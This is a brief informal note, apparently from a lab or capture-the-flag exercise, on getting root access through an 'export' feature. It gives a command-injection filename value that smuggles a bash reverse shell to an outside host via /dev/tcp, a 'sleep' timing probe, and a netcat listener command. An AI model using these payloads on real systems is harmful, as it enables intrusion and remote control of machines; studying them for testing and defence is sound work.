Root acces: the idea is that they spawn a reverse shell through export
https://gtfobins.org/gtfobins/bash/#reverse-shell

This can be achieved with these commands:
x.pdf; bash -c 'exec bash -i &>/dev/tcp/localhost.com/12345 <&1'
x; sleep 5 #

Attacker spawns something like
nc -l -p 12345

Now that they have a shell we just need to figure out how they escalata